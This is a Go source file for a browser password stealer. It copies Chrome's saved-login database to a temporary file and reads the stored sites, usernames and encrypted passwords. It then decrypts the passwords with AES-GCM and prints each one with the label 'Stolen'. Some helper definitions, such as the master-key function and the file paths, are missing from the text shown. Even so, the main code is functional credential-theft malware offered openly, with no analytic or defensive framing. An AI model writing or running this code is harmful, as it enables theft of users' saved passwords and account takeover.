package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"fmt"
	"io"
	"os"
	"time"
)

type Credential struct {
	URL       string `json:"url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Timestamp string `json:"timestamp"`
}

func findLoginData() error {
	source, err := os.Open(CHROME_PATH)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(TEMP_DB_PATH)
	if err != nil {
		return err
	}
	defer destination.Close()

	_, err = io.Copy(destination, source)
	if err != nil {
		return err
	}

	return nil
}

func decryptPassword(encryptedPassword []byte, masterKey []byte) (string, error) {
	if len(encryptedPassword) < 3 {
		return "", fmt.Errorf("encrypted password too short")
	}

	if string(encryptedPassword[:3]) == "v10" {
		encryptedPassword = encryptedPassword[3:]
	}

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}

	iv := encryptedPassword[:12]
	ciphertext := encryptedPassword[12:]

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt: %v", err)
	}

	return string(plaintext), nil
}

func stealPasswords() ([]Credential, error) {
	masterKey, err := getMasterKey()
	if err != nil {
		return nil, fmt.Errorf("failed to get master key: %v", err)
	}

	if err := findLoginData(); err != nil {
		return nil, err
	}
	defer os.Remove(TEMP_DB_PATH)

	db, err := sql.Open("sqlite3", TEMP_DB_PATH)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return nil, fmt.Errorf("failed to query logins: %v", err)
	}
	defer rows.Close()

	var credentials []Credential
	for rows.Next() {
		var originURL, username string
		var encryptedPassword []byte
		if err := rows.Scan(&originURL, &username, &encryptedPassword); err != nil {
			continue
		}

		password, err := decryptPassword(encryptedPassword, masterKey)
		if err != nil {
			continue
		}

		credential := Credential{
			URL:       originURL,
			Username:  username,
			Password:  password,
			Timestamp: time.Now().Format(time.RFC3339),
		}
		credentials = append(credentials, credential)
		fmt.Printf("Stolen: %s @ %s - %s\n", username, originURL, password)
	}
	return credentials, nil
}
